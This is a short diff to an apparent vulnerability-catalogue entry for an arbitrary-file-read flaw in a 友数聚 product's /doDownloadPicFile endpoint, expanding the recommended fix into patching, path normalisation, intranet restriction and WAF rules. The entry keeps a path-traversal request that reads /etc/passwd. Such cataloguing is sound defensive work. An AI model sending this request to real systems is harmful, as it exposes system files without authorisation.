@@ -4,7 +4,7 @@ type = "任意文件读取"
 path = "/doDownloadPicFile"
 version = ""
 detail = "GET /doDownloadPicFile?filePath=../../../../etc/passwd HTTP/1.1 Host: target"
-fix = "升级至最新版本"
+fix = "联系友数聚厂商获取安全补丁；对 doDownloadPicFile 的 filePath 参数进行路径规范化检查，拒绝包含 ../ 遍历序列的输入；限制该接口仅允许内网访问；WAF 拦截路径遍历特征。"
 date = 20260501
 label = "nday"
 cve = "TVD-2026-11493"
